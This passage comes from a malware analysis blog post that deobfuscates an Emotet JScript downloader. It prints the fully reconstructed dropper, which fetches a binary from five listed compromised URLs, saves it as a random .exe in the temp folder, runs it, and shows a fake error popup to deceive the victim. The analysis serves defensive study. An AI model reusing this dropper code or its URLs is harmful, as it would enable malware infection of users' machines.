                <span class="kw1">case</span> <span class="st0">'1'</span><span class="sy0">:</span>
                    bq<span class="br0">&#91;</span><span class="st0">&quot;console&quot;</span><span class="br0">&#93;</span><span class="br0">&#91;</span><span class="st0">&quot;warn&quot;</span><span class="br0">&#93;</span> <span class="sy0">=</span> bp<span class="sy0">;</span>
                    <span class="kw1">continue</span><span class="sy0">;</span>
                <span class="kw1">case</span> <span class="st0">'2'</span><span class="sy0">:</span>
                    bq<span class="br0">&#91;</span><span class="st0">'console'</span><span class="br0">&#93;</span><span class="br0">&#91;</span><span class="st0">&quot;log&quot;</span><span class="br0">&#93;</span> <span class="sy0">=</span> bp<span class="sy0">;</span>
                    <span class="kw1">continue</span><span class="sy0">;</span>
                <span class="kw1">case</span> <span class="st0">'3'</span><span class="sy0">:</span>
                    bq<span class="br0">&#91;</span><span class="st0">'console'</span><span class="br0">&#93;</span><span class="br0">&#91;</span><span class="st0">&quot;info&quot;</span><span class="br0">&#93;</span> <span class="sy0">=</span> bp<span class="sy0">;</span>
                    <span class="kw1">continue</span><span class="sy0">;</span>
                <span class="kw1">case</span> <span class="st0">'4'</span><span class="sy0">:</span>
                    bq<span class="br0">&#91;</span><span class="st0">&quot;console&quot;</span><span class="br0">&#93;</span><span class="br0">&#91;</span><span class="st0">'exception'</span><span class="br0">&#93;</span> <span class="sy0">=</span> bp<span class="sy0">;</span>
                    <span class="kw1">continue</span><span class="sy0">;</span>
                <span class="kw1">case</span> <span class="st0">'5'</span><span class="sy0">:</span>
                    bq<span class="br0">&#91;</span><span class="st0">&quot;console&quot;</span><span class="br0">&#93;</span><span class="br0">&#91;</span><span class="st0">&quot;trace&quot;</span><span class="br0">&#93;</span> <span class="sy0">=</span> bp<span class="sy0">;</span>
                    <span class="kw1">continue</span><span class="sy0">;</span>
                <span class="kw1">case</span> <span class="st0">'6'</span><span class="sy0">:</span>
                    bq<span class="br0">&#91;</span><span class="st0">'console'</span><span class="br0">&#93;</span><span class="br0">&#91;</span><span class="st0">&quot;error&quot;</span><span class="br0">&#93;</span> <span class="sy0">=</span> bp<span class="sy0">;</span>
                    <span class="kw1">continue</span><span class="sy0">;</span>
            <span class="br0">&#125;</span>
            <span class="kw1">break</span><span class="sy0">;</span>
        <span class="br0">&#125;</span>
    <span class="br0">&#125;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>Several fields within the console object are set equal to <em>bp</em>, which is defined as an empty function in the first line of the excerpt. This example also serves to show that not all obfuscation needs to be removed in order to make the code readable. The last switch does not need to be removed, as the order of the execution does not matter. The fact that functions are replaced is already visible.</p>
<p>Code segments like this are inserted to hinder dynamic analysis, which is often much quicker than static analysis. Since this analysis is done statically, code segments like these are considered clutter. As such, they can be removed from the script once it is certain that none of the code that is present in the original input is handled within such a function.</p>
<h3>Function callbacks</h3>
<p>Usually, a function requires arguments and returns a value based upon the input. Sometimes, one or more of the arguments is also altered. It is also possible to provide a function as an argument. The obfuscation here passes a function with two arguments, which is done several times. The first argument is the data to use, whereas the second argument is a boolean. Within the function, a check is done to see if the value is either <em>true</em> or <em>false</em>. Depending on the hardcoded path, either of these values is required to continue the execution. This further obscures the execution path within the obfuscated code, especially if this is done in all functions. </p>
<p>To illustrate the above, two functions will be discussed. Below, the <em>cs</em> function partially given.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1">cs<span class="br0">&#40;</span>urlThree<span class="sy0">,</span> <span class="kw1">function</span><span class="br0">&#40;</span>dd<span class="sy0">,</span> de<span class="br0">&#41;</span> <span class="br0">&#123;</span>
	<span class="kw1">if</span> <span class="br0">&#40;</span><span class="sy0">!</span>de<span class="br0">&#41;</span> <span class="br0">&#123;</span>
		<span class="kw1">return</span> cT<span class="br0">&#40;</span>dd<span class="sy0">,</span> <span class="sy0">!</span><span class="br0">&#91;</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
	<span class="br0">&#125;</span>
<span class="co1">//[...]</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>As stated before, the function that is passed as the second argument requires two parameters. The first is the URL, and the second is the function to continue the execution in. In this case, the hardcoded boolean value should be <em>false</em>.</p>
<p>The <em>cs</em> function is given below in its refactored form.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">function</span> cs<span class="br0">&#40;</span>ct<span class="sy0">,</span> cu<span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">try</span> <span class="br0">&#123;</span>
        <span class="kw1">var</span> httpObject <span class="sy0">=</span> <span class="kw1">new</span> activeXObject<span class="br0">&#40;</span><span class="st0">&quot;MSXML2.XMLHTTP&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        httpObject<span class="br0">&#91;</span><span class="st0">&quot;open&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="st0">&quot;GET&quot;</span><span class="sy0">,</span> ct<span class="sy0">,</span> <span class="sy0">!</span><span class="br0">&#91;</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        httpObject<span class="br0">&#91;</span><span class="st0">&quot;send&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        <span class="kw1">if</span> <span class="br0">&#40;</span>httpObject<span class="br0">&#91;</span><span class="st0">&quot;status&quot;</span><span class="br0">&#93;</span> <span class="sy0">==</span> <span class="nu0">200</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
            <span class="kw1">return</span> <span class="br0">&#40;</span>cu<span class="br0">&#40;</span>httpObject<span class="br0">&#91;</span><span class="st0">'ResponseBody'</span><span class="br0">&#93;</span><span class="sy0">,</span> <span class="sy0">!</span><span class="br0">&#91;</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        <span class="br0">&#125;</span> <span class="kw1">else</span> <span class="br0">&#123;</span>
            <span class="kw1">return</span> cu<span class="br0">&#40;</span><span class="kw2">null</span><span class="sy0">,</span> <span class="sy0">!!</span><span class="br0">&#91;</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
        <span class="br0">&#125;</span>
    <span class="br0">&#125;</span> <span class="kw1">catch</span> <span class="br0">&#40;</span>cR<span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="kw1">return</span> cu<span class="br0">&#40;</span><span class="kw2">null</span><span class="sy0">,</span> <span class="sy0">!!</span><span class="br0">&#91;</span><span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>If the HTTP status code is equal to OK (status code 200), the Emotet binary could be downloaded. Note that <em>cu</em> is the function that is passed to <em>cs</em>. The binary itself is then passed to <em>cu</em> as the first argument. The second argument that is passed to <em>cu</em> is <em>![]</em>, which equals <em>false</em>. The boolean&#8217;s value should be false to successfully continue the execution, as can be seen in the code of <em>cu</em>.</p>
<p>Rewriting the code can be done by defining more functions that do not require the boolean to follow the correct path, but return the first argument that is passed to given function. To illustrate, the <em>cs</em> function would return the response body.</p>
<p><a name ="reconstructing-the-original-script"></a></p>
<h2><a href="#reconstructing-the-original-script">Reconstructing the original script</a></h2>
<p>Based on the obfuscation techniques that are given above, one can clean the code. Removing the content that is not centered around the interesting variables will remove the anti-tampering and anti-debugging code that is present. By removing the function callbacks, more functions will be created, which also results in a clearer overview for the analyst.</p>
<p>Once all relevant code is gathered and cleaned, the original input can be recovered. Functions names and variable names can be refactored to improve the readability of the code even further.</p>
<h3>Analysing the original script</h3>
<p>The refactored and cleaned script is analysed in parts, after which the whole script is given.</p>
<p>The first part of the script contains the variables. As most of the variables occurred only once, the sole occurence has been replaced by its value. The five URLs are stored in a single array, as this makes the iteration over all five URLs easier.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">var</span> urls <span class="sy0">=</span> <span class="br0">&#91;</span><span class="st0">'https://miraigroupsumatera.com/wp-includes/wkcw90205/'</span><span class="sy0">,</span> <span class="st0">&quot;https://careervsjob.com/wp-content/0nzppxq49/&quot;</span><span class="sy0">,</span> <span class="st0">&quot;https://gaosanxuexi.com/css/q3z3ljo394/&quot;</span><span class="sy0">,</span> <span class="st0">&quot;http://www.cbdnewsdirect.com/wordpress/5l1kpx45/&quot;</span><span class="sy0">,</span> <span class="st0">'https://kaaryathalo.com/wp-content/231/'</span><span class="br0">&#93;</span><span class="sy0">;</span>
<span class="kw1">var</span> activeXObject <span class="sy0">=</span> <span class="st0">'ActiveXObject'</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The next function, named <em>download</em>, is used to download the Emotet binary from a given URL using a <a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms757849(v%3Dvs.85)">Microsfot XML object</a>. The request is not async, as is defined by the third argument in the <em>open</em> function. Only if the HTTP status code is OK (which is equal to 200), the response body is returned.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">function</span> download<span class="br0">&#40;</span>url<span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">var</span> httpObject <span class="sy0">=</span> <span class="kw1">new</span> activeXObject<span class="br0">&#40;</span><span class="st0">&quot;MSXML2.XMLHTTP&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    httpObject<span class="br0">&#91;</span><span class="st0">&quot;open&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="st0">&quot;GET&quot;</span><span class="sy0">,</span> url<span class="sy0">,</span> <span class="kw2">false</span><span class="br0">&#41;</span><span class="sy0">;</span>
    httpObject<span class="br0">&#91;</span><span class="st0">&quot;send&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>httpObject<span class="br0">&#91;</span><span class="st0">&quot;status&quot;</span><span class="br0">&#93;</span> <span class="sy0">==</span> <span class="nu0">200</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="kw1">return</span> httpObject<span class="br0">&#91;</span><span class="st0">'ResponseBody'</span><span class="br0">&#93;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span> <span class="kw1">else</span> <span class="br0">&#123;</span>
        <span class="kw1">return</span> <span class="kw2">null</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>Once downloaded, the response body needs to be saved somewhere. The <em>getOutputPath</em> function generates the full path, including a random file name with the <em>exe</em> extension to save the downloaded binary to. The <a href="https://www.w3schools.com/asp/met_getspecialfolder.asp">GetSpecialFolder</a> function, when given the argument is <em>2</em>, returns the path to the temporary folder on the system. </p>
<p>The file name starts with <em>\x5c</em>, which equals <em>\\</em>, as the temporary folder&#8217;s location does not end with a backslash. This needs to be added before the file name can be appended.</p>
<p>The file name is nine characters long, and is obtained using the <a href="https://www.w3schools.com/jsref/jsref_random.asp">random</a> function. The result from this function always starts with zero dot. To remove these two characters, a substring that is nine characters long, starting at the second index, is taken.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">function</span> getOutputPath<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">var</span> fileSystemObject <span class="sy0">=</span> <span class="kw1">new</span> activeXObject<span class="br0">&#40;</span><span class="st0">&quot;Scripting.FileSystemObject&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">var</span> fileName <span class="sy0">=</span> <span class="st0">'<span class="es0">\x</span>5c'</span> <span class="sy0">+</span> <span class="kw4">Math</span>.<span class="me1">random</span><span class="br0">&#40;</span><span class="br0">&#41;</span>.<span class="me1">toString</span><span class="br0">&#40;</span><span class="nu0">36</span><span class="br0">&#41;</span>.<span class="me1">substr</span><span class="br0">&#40;</span><span class="nu0">2</span><span class="sy0">,</span> <span class="nu0">9</span><span class="br0">&#41;</span> <span class="sy0">+</span> <span class="st0">&quot;.exe&quot;</span><span class="sy0">;</span>
    <span class="kw1">var</span> outputPath <span class="sy0">=</span> fileSystemObject<span class="br0">&#91;</span><span class="st0">&quot;GetSpecialFolder&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="nu0">2</span><span class="br0">&#41;</span> <span class="sy0">+</span> fileName<span class="sy0">;</span>
    <span class="kw1">return</span> outputPath<span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The <em>saveAndRun</em> function gets the the output path for the downloaded file, and saves the file to the disk using an <a href="https://www.w3schools.com/asp/ado_ref_stream.asp">ADO Stream Object</a>. The type is set to <em>1</em>, which corresponds with the <em>adTypeBinary</em> constant in the <a href="https://www.w3schools.com/asp/prop_stream_type.asp#streamtypeenum">StreamTypeEnum</a>. This is correct, since the downloaded data is a byte array.</p>
<p>The <a href="https://www.w3schools.com/asp/met_stream_savetofile.asp">SaveToFile</a> function saves the file to the given location. The second parameter, <em>2</em>, is equal to the <em>adSaveCreateOverWrite</em> constant in the <a href="https://www.w3schools.com/asp/met_stream_savetofile.asp#SaveOptionsEnum">SaveOptionsEnum</a>. If there already is a file with the randomly generated name, it is overwritten.</p>
<p>At last, the <a href="https://docs.microsoft.com/en-us/windows/win32/shell/shell-windows">WScript Shell</a> is used to execute the file that was just written to the disk.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">function</span> saveAndRun<span class="br0">&#40;</span>data<span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">var</span> outputPath <span class="sy0">=</span> getOutputPath<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>        
    <span class="kw1">var</span> adodbStream <span class="sy0">=</span> <span class="kw1">new</span> activeXObject<span class="br0">&#40;</span><span class="st0">'ADODB.Stream'</span><span class="br0">&#41;</span><span class="sy0">;</span>
    adodbStream<span class="br0">&#91;</span><span class="st0">'Open'</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    adodbStream<span class="br0">&#91;</span><span class="st0">&quot;Type&quot;</span><span class="br0">&#93;</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
    adodbStream<span class="br0">&#91;</span><span class="st0">&quot;Write&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>data<span class="br0">&#41;</span><span class="sy0">;</span>
    adodbStream<span class="br0">&#91;</span><span class="st0">&quot;Position&quot;</span><span class="br0">&#93;</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
    adodbStream<span class="br0">&#91;</span><span class="st0">&quot;SaveToFile&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>outputPath<span class="sy0">,</span> <span class="nu0">2</span><span class="br0">&#41;</span><span class="sy0">;</span>
    adodbStream<span class="br0">&#91;</span><span class="st0">&quot;Close&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">var</span> shell <span class="sy0">=</span> <span class="kw1">new</span> activeXObject<span class="br0">&#40;</span><span class="st0">&quot;WScript.Shell&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    shell<span class="br0">&#91;</span><span class="st0">&quot;Run&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>outputPath<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The start function is used to display the fake error message to the victim, using the WScript Shell&#8217;s <a href="https://www.vbsedit.com/html/f482c739-3cf9-4139-a6af-3bde299b8009.asp">Popup</a> function. The first argument is the text to display. The second argument is the amount of seconds that the message box should maximally be displayed, where the value <em>0</em> is used to mark the time frame as indefinite. The third argument is the title of the message box. The last argument is the icon type of the messagebox, where <em>64</em> refers to the informational message box icon.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">function</span> start<span class="br0">&#40;</span>data<span class="sy0">,</span> shouldRun<span class="br0">&#41;</span> <span class="br0">&#123;</span>
    WshShell <span class="sy0">=</span> WScript<span class="br0">&#91;</span><span class="st0">&quot;CreateObject&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="st0">&quot;WScript.Shell&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    Text <span class="sy0">=</span> <span class="st0">&quot;There was an error opening this document. The file is damaged and could not be repaired (for example, it was sent as an email attachment and wasn't correctly decoded).&quot;</span><span class="sy0">;</span>
    Title <span class="sy0">=</span> <span class="st0">&quot;Not Supported File Format&quot;</span><span class="sy0">;</span>
    Res <span class="sy0">=</span> WshShell<span class="br0">&#91;</span><span class="st0">&quot;Popup&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>Text<span class="sy0">,</span> <span class="nu0">0</span><span class="sy0">,</span> Title<span class="sy0">,</span> <span class="nu0">64</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>shouldRun<span class="br0">&#41;</span> saveAndRun<span class="br0">&#40;</span>data<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>After all functions have been defined, the URL array can be iterated through to download the binary. If the download is successful, the data is saved to the disk, and then executed. At last, the fake error message is displayed.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">for</span> <span class="br0">&#40;</span><span class="kw1">var</span> i <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span> i <span class="sy0">&lt;</span> urls.<span class="me1">length</span><span class="sy0">;</span> i<span class="sy0">++</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">var</span> data <span class="sy0">=</span> download<span class="br0">&#40;</span>urls<span class="br0">&#91;</span>i<span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span><span class="br0">&#40;</span>data<span class="br0">&#41;</span> start<span class="br0">&#40;</span>data<span class="sy0">,</span> <span class="kw2">true</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The complete script is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="javascript"><pre class="de1"><span class="kw1">var</span> urls <span class="sy0">=</span> <span class="br0">&#91;</span><span class="st0">'https://miraigroupsumatera.com/wp-includes/wkcw90205/'</span><span class="sy0">,</span> <span class="st0">&quot;https://careervsjob.com/wp-content/0nzppxq49/&quot;</span><span class="sy0">,</span> <span class="st0">&quot;https://gaosanxuexi.com/css/q3z3ljo394/&quot;</span><span class="sy0">,</span> <span class="st0">&quot;http://www.cbdnewsdirect.com/wordpress/5l1kpx45/&quot;</span><span class="sy0">,</span> <span class="st0">'https://kaaryathalo.com/wp-content/231/'</span><span class="br0">&#93;</span><span class="sy0">;</span>
<span class="kw1">var</span> activeXObject <span class="sy0">=</span> <span class="st0">'ActiveXObject'</span><span class="sy0">;</span>
&nbsp;
<span class="kw1">function</span> download<span class="br0">&#40;</span>url<span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">var</span> httpObject <span class="sy0">=</span> <span class="kw1">new</span> activeXObject<span class="br0">&#40;</span><span class="st0">&quot;MSXML2.XMLHTTP&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    httpObject<span class="br0">&#91;</span><span class="st0">&quot;open&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="st0">&quot;GET&quot;</span><span class="sy0">,</span> url<span class="sy0">,</span> <span class="kw2">false</span><span class="br0">&#41;</span><span class="sy0">;</span>
    httpObject<span class="br0">&#91;</span><span class="st0">&quot;send&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>httpObject<span class="br0">&#91;</span><span class="st0">&quot;status&quot;</span><span class="br0">&#93;</span> <span class="sy0">==</span> <span class="nu0">200</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="kw1">return</span> httpObject<span class="br0">&#91;</span><span class="st0">'ResponseBody'</span><span class="br0">&#93;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span> <span class="kw1">else</span> <span class="br0">&#123;</span>
        <span class="kw1">return</span> <span class="kw2">null</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
<span class="br0">&#125;</span>
&nbsp;
<span class="kw1">function</span> getOutputPath<span class="br0">&#40;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">var</span> fileSystemObject <span class="sy0">=</span> <span class="kw1">new</span> activeXObject<span class="br0">&#40;</span><span class="st0">&quot;Scripting.FileSystemObject&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">var</span> fileName <span class="sy0">=</span> <span class="st0">'<span class="es0">\x</span>5c'</span> <span class="sy0">+</span> <span class="kw4">Math</span>.<span class="me1">random</span><span class="br0">&#40;</span><span class="br0">&#41;</span>.<span class="me1">toString</span><span class="br0">&#40;</span><span class="nu0">36</span><span class="br0">&#41;</span>.<span class="me1">substr</span><span class="br0">&#40;</span><span class="nu0">2</span><span class="sy0">,</span> <span class="nu0">9</span><span class="br0">&#41;</span> <span class="sy0">+</span> <span class="st0">&quot;.exe&quot;</span><span class="sy0">;</span>
    <span class="kw1">var</span> outputPath <span class="sy0">=</span> fileSystemObject<span class="br0">&#91;</span><span class="st0">&quot;GetSpecialFolder&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="nu0">2</span><span class="br0">&#41;</span> <span class="sy0">+</span> fileName<span class="sy0">;</span>
    <span class="kw1">return</span> outputPath<span class="sy0">;</span>
<span class="br0">&#125;</span>
&nbsp;
<span class="kw1">function</span> saveAndRun<span class="br0">&#40;</span>data<span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">var</span> outputPath <span class="sy0">=</span> getOutputPath<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>        
    <span class="kw1">var</span> adodbStream <span class="sy0">=</span> <span class="kw1">new</span> activeXObject<span class="br0">&#40;</span><span class="st0">'ADODB.Stream'</span><span class="br0">&#41;</span><span class="sy0">;</span>
    adodbStream<span class="br0">&#91;</span><span class="st0">'Open'</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    adodbStream<span class="br0">&#91;</span><span class="st0">&quot;Type&quot;</span><span class="br0">&#93;</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
    adodbStream<span class="br0">&#91;</span><span class="st0">&quot;Write&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>data<span class="br0">&#41;</span><span class="sy0">;</span>
    adodbStream<span class="br0">&#91;</span><span class="st0">&quot;Position&quot;</span><span class="br0">&#93;</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
    adodbStream<span class="br0">&#91;</span><span class="st0">&quot;SaveToFile&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>outputPath<span class="sy0">,</span> <span class="nu0">2</span><span class="br0">&#41;</span><span class="sy0">;</span>
    adodbStream<span class="br0">&#91;</span><span class="st0">&quot;Close&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">var</span> shell <span class="sy0">=</span> <span class="kw1">new</span> activeXObject<span class="br0">&#40;</span><span class="st0">&quot;WScript.Shell&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    shell<span class="br0">&#91;</span><span class="st0">&quot;Run&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>outputPath<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&nbsp;
<span class="kw1">function</span> start<span class="br0">&#40;</span>data<span class="sy0">,</span> shouldRun<span class="br0">&#41;</span> <span class="br0">&#123;</span>
    WshShell <span class="sy0">=</span> WScript<span class="br0">&#91;</span><span class="st0">&quot;CreateObject&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span><span class="st0">&quot;WScript.Shell&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    Text <span class="sy0">=</span> <span class="st0">&quot;There was an error opening this document. The file is damaged and could not be repaired (for example, it was sent as an email attachment and wasn't correctly decoded).&quot;</span><span class="sy0">;</span>
    Title <span class="sy0">=</span> <span class="st0">&quot;Not Supported File Format&quot;</span><span class="sy0">;</span>
    Res <span class="sy0">=</span> WshShell<span class="br0">&#91;</span><span class="st0">&quot;Popup&quot;</span><span class="br0">&#93;</span><span class="br0">&#40;</span>Text<span class="sy0">,</span> <span class="nu0">0</span><span class="sy0">,</span> Title<span class="sy0">,</span> <span class="nu0">64</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>shouldRun<span class="br0">&#41;</span> saveAndRun<span class="br0">&#40;</span>data<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
&nbsp;
<span class="kw1">for</span> <span class="br0">&#40;</span><span class="kw1">var</span> i <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span> i <span class="sy0">&lt;</span> urls.<span class="me1">length</span><span class="sy0">;</span> i<span class="sy0">++</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">var</span> data <span class="sy0">=</span> download<span class="br0">&#40;</span>urls<span class="br0">&#91;</span>i<span class="br0">&#93;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span><span class="br0">&#40;</span>data<span class="br0">&#41;</span> start<span class="br0">&#40;</span>data<span class="sy0">,</span> <span class="kw2">true</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p><a name ="conclusion"></a></p>
<h2><a href="#conclusion">Conclusion</a></h2>
<p>By recognising patterns in the code, one can remove the obfuscation. This is, however, a time consuming task. Therefore, it is essential to find a balance between deobfuscating code and reading obfuscated code. The amount of code that needs to be deobfuscated differs based on the goal of the analysis.</p>
<p>The analysis, deobfuscation, and refactoring efforts reduced the code from 1067 lines of code, into 46 lines of code. This is a reduction in size of more than 95 percent, allowing the analyst to quickly read and understand the code. Based on this, future changes can be tracked without fully deobfuscating the sample.</p>
<hr />
<p>To contact me, you can e-mail me at [info][at][maxkersten][dot][nl], or DM me on Twitter <a href="https://twitter.com/Libranalysis">@Libranalysis</a>.</p>
					</div><!-- .entry-content -->
			</div><!-- .inside-article -->
</article><!-- #post-## -->

				
								</main><!-- #main -->
	</div><!-- #primary -->

<div id="right-sidebar" itemtype="http://schema.org/WPSideBar" itemscope="itemscope" role="complementary" class="widget-area grid-25 tablet-grid-25 grid-parent sidebar">
	<div class="inside-right-sidebar">
				
		<aside id="recent-posts-2" class="widget inner-padding widget_recent_entries">
		<h4 class="widget-title">Recent Posts</h4>
		<ul>
											<li>
					<a href="https://maxkersten.nl/2024/11/27/ghidra-tip-0x08-scripting-with-microservices/">Ghidra Tip 0x08: Scripting with microservices</a>
									</li>
											<li>
					<a href="https://maxkersten.nl/2024/10/31/ghidra-tip-0x07-iterating-over-all-strings-in-a-program/">Ghidra Tip 0x07: Iterating over all strings in a Program</a>
									</li>
											<li>
					<a href="https://maxkersten.nl/2024/09/28/ghidra-tip-0x06-domainfiles-in-projects/">Ghidra Tip 0x06: DomainFiles in Projects</a>
									</li>
											<li>
					<a href="https://maxkersten.nl/2024/08/18/my-impression-of-tdi-2024-blackhat-usa-2024-and-defcon-32/">My impression of TDI 2024, BlackHat USA 2024 and DEFCON 32</a>
									</li>
											<li>
					<a href="https://maxkersten.nl/2024/06/30/ghidra-tip-0x05-headless-execution/">Ghidra Tip 0x05: Headless execution</a>
									</li>
					</ul>

		</aside><aside id="archives-2" class="widget inner-padding widget_archive"><h4 class="widget-title">Archives</h4>
			<ul>
